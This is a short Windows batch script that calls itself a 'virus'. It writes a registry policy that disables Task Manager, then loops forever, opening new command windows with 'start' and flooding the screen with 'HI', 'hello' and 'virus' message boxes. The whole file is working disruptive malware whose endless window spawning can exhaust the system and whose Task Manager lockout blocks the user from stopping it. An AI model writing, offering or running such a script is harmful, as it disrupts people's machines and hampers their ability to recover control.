@echo off
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
:x
start
chcp 1251
msg * HI
chcp 1251
msg * hello
chcp 1251
msg * virus
goto x
